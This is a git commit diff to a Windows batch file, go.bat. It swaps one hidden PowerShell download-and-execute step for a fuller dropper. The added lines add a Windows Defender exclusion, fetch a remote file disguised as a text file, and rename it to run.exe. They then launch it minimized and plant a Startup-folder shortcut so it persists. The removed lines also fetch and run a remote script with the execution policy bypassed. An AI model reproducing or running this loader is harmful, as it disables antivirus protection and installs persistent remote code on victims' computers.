5e286ea9683c393b2b63d34c4981095939c39d60
PXTDEV9022 <qnuts1tg222@gmail.com>
2024-12-28 15:31:59 +0700

    Update go.bat

--- go.bat
+++ go.bat
@@ -1,6 +1,11 @@
 @echo off
-set "psFileUrl=https://raw.githubusercontent.com/PXTDEV9022/blackmmo22/refs/heads/main/Document.ps1"
-set "psFilePath=C:\Users\Public\Document.ps1"
-
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%psFileUrl%' -OutFile '%psFilePath%'"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psFilePath%"
+set folder=C:\Users\%USERNAME%\Public
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%folder%'"
+set download_url=https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt
+set download_location=C:\Users\%USERNAME%\Documents\document.txt
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%download_location%'"
+rename "%download_location%" "run.exe"
+start /min "" "C:\Users\%USERNAME%\Documents\run.exe"
+set shortcut_path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk
+powershell -WindowStyle Hidden -Command "$WScript = New-Object -ComObject WScript.Shell; $Shortcut = $WScript.CreateShortcut('%shortcut_path%'); $Shortcut.TargetPath = 'C:\Users\%USERNAME%\Documents\run.exe'; $Shortcut.Save()"
+exit
